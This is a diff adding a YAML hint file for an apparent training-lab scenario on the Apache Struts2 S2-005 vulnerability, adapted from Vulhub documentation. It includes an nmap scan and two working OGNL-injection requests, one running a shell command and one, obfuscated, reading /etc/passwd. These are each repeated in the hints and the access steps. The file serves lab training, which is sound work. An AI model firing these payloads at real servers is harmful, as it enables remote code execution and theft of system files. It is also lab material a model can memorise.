@@ -1,0 +1,115 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: struts2/s2-005
+hint_levels:
+  low:
+  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  high:
+  - 'Vulnerability: S2-005 Remote Code Execution Vulnerability.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    POC && EXP
+
+    ### Remote code execution POC (don't have display echo, use `@` instead space)
+
+    ```
+    GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
+    Host: target:8080
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36
+
+    ```
+
+    Some others POC will return 400 in tomcat8.Because the characters `\`, `"` can't be placed directly in the path, we need urlencode it before send.
+
+    This POC don't have display, used OGNL's Expression Evaluation:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-005/1.jpeg
+
+    `(aaa)(bbb)`, `aaa` is used as the OGNL expression string, and `bbb` is the root object of the expression. Therefore, if we needs to execute code like `aaa`, it needs to be wrapped in quotation marks, and the `bbb` position can directly place the Java statement. `(aaa)(bbb)=true` is actually `aaa=true`.
+
+    However, how to understand exactly, it needs further research and to be optimized. Hope someone can write a POC that can display echo.
+
+    ### Remote code execution POC (have display echo, command need urlencode)
+
+    ```
+    POST /example/HelloWorld.action HTTP/1.1
+    Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)
+    Host: target:8080
+    redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-005/s2-005-3.png
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-005/s2-005-4.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-005/README.md'
+  - |-
+    Additional public references:
+    - http://struts.apache.org/docs/s2-005.html
+access_instructions:
+  title: S2-005 Remote Code Execution Vulnerability
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+  - title: POC && EXP
+    instructions: |-
+      ### Remote code execution POC (don't have display echo, use `@` instead space)
+
+      ```
+      GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
+      Host: target:8080
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36
+
+      ```
+
+      Some others POC will return 400 in tomcat8.Because the characters `\`, `"` can't be placed directly in the path, we need urlencode it before send.
+
+      This POC don't have display, used OGNL's Expression Evaluation:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-005/1.jpeg
+
+      `(aaa)(bbb)`, `aaa` is used as the OGNL expression string, and `bbb` is the root object of the expression. Therefore, if we needs to execute code like `aaa`, it needs to be wrapped in quotation marks, and the `bbb` position can directly place the Java statement. `(aaa)(bbb)=true` is actually `aaa=true`.
+
+      However, how to understand exactly, it needs further research and to be optimized. Hope someone can write a POC that can display echo.
+
+      ### Remote code execution POC (have display echo, command need urlencode)
+
+      ```
+      POST /example/HelloWorld.action HTTP/1.1
+      Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)
+      Host: target:8080
+      redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-005/s2-005-3.png
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-005/s2-005-4.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-005/README.md
+  readme_sha256: 15ee36a74a811304b3c1fd51648b28570e1e4a78a4f70b5b572a09e8060acebe
+  compose_sha256: 6b829d3db6d54ade90e428bb8834db9e521fa5e88a94b32b1e42306b14c97ec3
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
